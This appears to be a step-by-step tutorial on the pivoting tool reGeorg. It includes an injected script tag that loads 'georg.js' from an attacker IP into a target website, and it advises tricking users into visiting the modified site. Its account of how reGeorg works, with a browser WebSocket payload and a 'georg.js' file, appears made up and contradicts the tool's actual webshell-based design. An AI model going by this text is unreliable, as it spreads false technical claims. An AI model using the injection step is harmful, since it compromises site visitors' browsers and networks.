# reGeorg - A web socks proxy tool

reGeorg is a powerful tool that facilitates proxy pivoting, enabling an ethical hacker to establish a connection from a compromised user's browser to the attacker's machine. This connection serves as a channel to bypass network restrictions and gain access to internal resources. It leverages techniques such as tunneling HTTP traffic over a WebSocket connection to achieve its objectives.

Below is a step by step tutorial on how to use the tool:
## Step 1: Set up your environment

Ensure you have a target system or network that you have permission to test.
Prepare a machine for launching the attack and installing reGeorg. This machine will act as your attacker machine.

## Step 2: Download and install reGeorg

Visit the GitHub repository of reGeorg (https://github.com/sensepost/reGeorg) and download the latest version of the tool.
Extract the downloaded file to a directory on your attacker machine.

## Step 3: Configure your attacker machine

Make sure your attacker machine has the necessary dependencies installed, such as Python and PHP.
Set up a web server on your attacker machine. For example, you can use Apache or Nginx.
Move the reGeorg script to the web server's document root.

## Step 4: Launch the reGeorg server

Open a terminal or command prompt on your attacker machine.
Navigate to the directory where you extracted reGeorg.
Start the reGeorg server by running the following command:

```
python reGeorgSocksProxy.py -p <port_number>
```
Replace <port_number> with the port on which you want the server to listen. The default port is 8080.

## Step 5: Prepare the payload

Identify the target website or application you want to attack.
Modify the source code of the target website or application to include a reference to the reGeorg script. For example, you can add the following line of code within a <script> tag:

```
<script src="http://<attacker_ip>:<port_number>/georg.js"></script>
```

Replace <attacker_ip> with the IP address of your attacker machine and <port_number> with the port number you specified in the previous step.

## Step 6: Trigger the payload

Host the modified target website or application on a server or test environment.
Trick the target user or perform a penetration test by getting the user to visit the modified target website or application.
When the user's browser loads the website or application, the reGeorg script will be fetched and executed, establishing a connection to your reGeorg server.

## Step 7: Exploit the pivoting capabilities

Once the user's browser establishes a connection with your reGeorg server, you can use it to perform various network pivoting activities.
For example, you can use tools like proxychains or socksify to route traffic through the reGeorg proxy, gaining access to internal systems or resources.

**Remember to exercise caution and always follow legal and ethical guidelines when using such tools.**